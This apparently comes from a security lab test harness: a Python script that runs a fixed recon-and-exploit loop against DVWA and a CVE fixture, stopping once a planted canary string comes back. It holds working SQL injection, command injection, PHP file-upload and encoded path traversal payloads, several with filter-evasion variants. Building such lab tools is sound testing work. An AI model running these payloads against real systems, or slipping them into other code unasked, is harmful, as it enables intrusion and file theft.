"""Deterministic agentic TTP chain for the isolated security lab.

The module is intentionally not an LLM. It models an agentic penetration tool
as a fixed Goals/Planner/Worker loop: recon, choose an exploit, try bounded
variants, observe the response, and stop when the synthetic canary is returned.
It runs inside the client or control container and never leaves the lab.
"""

import http.client
import json
import time
from urllib.parse import quote, urlencode

from evidence import USER_AGENT

DVWA_CANARY_PATH = "/tmp/kunato-lab-agentic-canary"
DVWA_UPLOAD_PATH = "/vulnerabilities/upload/"
DVWA_UPLOAD_PREFIX = "/hackable/uploads/"
CVE_CANARY_PATH = "/opt/kunato-lab/canary.txt"
CVE_ICON_PREFIX = "/icons/"
CVE_CGI_PREFIX = "/cgi-bin/"
MAX_RESPONSE_BYTES = 65536


def canary_value(fixture, nonce):
    if fixture == "dvwa":
        return f"CANARY-{nonce}"
    if fixture == "cve":
        return f"kunato-lab-canary-{nonce}"
    raise ValueError(f"Unsupported agentic fixture: {fixture}")


def sqli_variants():
    return [
        "1' UNION SELECT 1,secret FROM lab_canary-- -",
        "1'/**/UNION/**/SELECT/**/1,secret/**/FROM/**/lab_canary-- -",
        "1' UNION SELECT 1,secret FROM lab_canary#",
        "1' UnIoN SeLeCt 1,secret FrOm lab_canary-- -",
    ]


def exec_variants():
    return [
        f"127.0.0.1; cat {DVWA_CANARY_PATH}",
        f"127.0.0.1 | cat {DVWA_CANARY_PATH}",
        f"127.0.0.1$(cat {DVWA_CANARY_PATH})",
        f"127.0.0.1\ncat {DVWA_CANARY_PATH}",
        f"127.0.0.1;cat${{IFS}}{DVWA_CANARY_PATH}",
    ]


def upload_variants():
    payload = b"<?php echo file_get_contents('" + DVWA_CANARY_PATH.encode() + b"'); ?>"
    return [
        ("agentic.php", "image/jpeg", payload),
        ("agentic.php", "image/png", payload),
        ("agentic.phtml", "image/jpeg", payload),
    ]


def traversal_paths():
    return [
        f"/icons/.%2e/.%2e/.%2e/.%2e{CVE_CANARY_PATH}",
        f"/icons/..%2f..%2f..%2f..%2f{CVE_CANARY_PATH.lstrip('/')}",
        f"/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e{CVE_CANARY_PATH}",
    ]


def multipart_body(filename, content_type, payload):
    boundary = "----kunato-lab-agentic-boundary"
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="uploaded"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n").encode()
    body += payload
    body += (f"\r\n--{boundary}\r\n"
             "Content-Disposition: form-data; name=\"Upload\"\r\n\r\n"
             "Upload\r\n"
             f"--{boundary}--\r\n").encode()
    return boundary, body


class Agent:
    def __init__(self, fixture, host, port, nonce):
        self.fixture = fixture
        self.host = host
        self.port = port
        self.canary = canary_value(fixture, nonce)
        self.steps = []
        self.started = time.monotonic()

    def send(self, exploit, case, method, path, *, query=None, body=None, headers=None):
        target = path + ("?" + query if query else "")
        step = {"exploit": exploit, "case": case, "method": method, "path": path,
                "target": target, "status": None, "origin": None, "blocked": False,
                "canary": False, "error": None, "response": ""}
        connection = None
        started = time.monotonic()
        try:
            connection = http.client.HTTPConnection(self.host, self.port, timeout=5)
            request_headers = {"User-Agent": USER_AGENT,
                               "X-Kunato-Lab-Case": case,
                               "Connection": "close", **(headers or {})}
            connection.request(method, target, body=body, headers=request_headers)
            response = connection.getresponse()
            content = response.read(MAX_RESPONSE_BYTES + 1)
            if len(content) > MAX_RESPONSE_BYTES:
                raise ValueError("Response exceeds the agentic probe limit")
            text = content.decode("utf-8", errors="replace")
            step.update(status=response.status,
                        origin=response.getheader("X-Kunato-Lab-Origin"),
                        blocked=response.status in {403, 429, 503},
                        canary=self.canary in text,
                        response=text[:500])
        except (OSError, ValueError, http.client.HTTPException) as error:
            step["error"] = str(error)
        finally:
            if connection is not None:
                connection.close()
        step["elapsed_ms"] = round((time.monotonic() - started) * 1000, 2)
        self.steps.append(step)
        return step

    def outcome(self, exploit, success, paths):
        steps = [step for step in self.steps if step["exploit"] == exploit]
        statuses = [step["status"] for step in steps if step["status"] is not None]
        return {"success": bool(success),
                "blocked": any(step["blocked"] for step in steps),
                "status": statuses[-1] if statuses else None,
                "attempts": len(steps),
                "errors": sum(1 for step in steps if step["error"]),
                "paths": paths}

    def recon(self, paths):
        for index, path in enumerate(paths):
            self.send("recon", f"agentic-recon-{index}", "GET", path)

    def sqli(self):
        path = "/vulnerabilities/sqli/"
        for index, payload in enumerate(sqli_variants()):
            step = self.send("sqli", f"agentic-sqli-{index}", "GET", path,
                             query="id=" + quote(payload, safe="") + "&Submit=Submit")
            if step["canary"]:
                return self.outcome("sqli", True, [path])
        return self.outcome("sqli", False, [path])

    def exec(self):
        path = "/vulnerabilities/exec/"
        for index, payload in enumerate(exec_variants()):
            body = urlencode({"ip": payload, "Submit": "Submit"}).encode()
            step = self.send("exec", f"agentic-exec-{index}", "POST", path, body=body,
                             headers={"Content-Type": "application/x-www-form-urlencoded"})
            if step["canary"]:
                return self.outcome("exec", True, [path])
        return self.outcome("exec", False, [path])

    def upload(self):
        paths = [DVWA_UPLOAD_PATH]
        for index, (filename, content_type, payload) in enumerate(upload_variants()):
            boundary, body = multipart_body(filename, content_type, payload)
            upload = self.send("upload", f"agentic-upload-{index}", "POST",
                               DVWA_UPLOAD_PATH, body=body,
                               headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
            get_path = f"{DVWA_UPLOAD_PREFIX}{filename}"
            if get_path not in paths:
                paths.append(get_path)
            if upload["status"] is None:
                continue
            if not upload["blocked"]:
                step = self.send("upload", f"agentic-upload-get-{index}", "GET", get_path)
                if step["canary"]:
                    return self.outcome("upload", True, paths)
        return self.outcome("upload", False, paths)

    def traversal(self):
        paths = [CVE_ICON_PREFIX, CVE_CGI_PREFIX]
        for index, path in enumerate(traversal_paths()):
            step = self.send("traversal", f"agentic-traversal-{index}", "GET", path)
            if step["canary"]:
                return self.outcome("traversal", True, paths)
        return self.outcome("traversal", False, paths)

    def run(self):
        if self.fixture == "dvwa":
            self.recon(["/", "/vulnerabilities/sqli/", "/vulnerabilities/exec/",
                        DVWA_UPLOAD_PATH])
            exploits = {"sqli": self.sqli(), "exec": self.exec(), "upload": self.upload()}
        elif self.fixture == "cve":
            self.recon(["/", CVE_ICON_PREFIX, CVE_CGI_PREFIX])
            exploits = {"traversal": self.traversal()}
        else:
            raise ValueError(f"Unsupported agentic fixture: {self.fixture}")
        return {"id": f"agentic-{self.fixture}", "fixture": self.fixture,
                "canary": self.canary, "exploits": exploits,
                "canary_found": any(result["success"] for result in exploits.values()),
                "steps": self.steps,
                "elapsed_ms": round((time.monotonic() - self.started) * 1000, 2)}


def run_agent(fixture, host, port, nonce):
    if not nonce:
        return {"id": f"agentic-{fixture}", "fixture": fixture, "error": "canary nonce is required",
                "exploits": {}, "steps": []}
    try:
        return Agent(fixture, host, port, nonce).run()
    except ValueError as error:
        return {"id": f"agentic-{fixture}", "fixture": fixture, "error": str(error),
                "exploits": {}, "steps": []}


def main():
    import argparse
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--fixture", choices=["dvwa", "cve"], required=True)
    parser.add_argument("--host", default="app.test")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--canary", required=True)
    args = parser.parse_args()
    result = run_agent(args.fixture, args.host, args.port, args.canary)
    print(json.dumps(result))
    return int("error" in result)


if __name__ == "__main__":
    raise SystemExit(main())
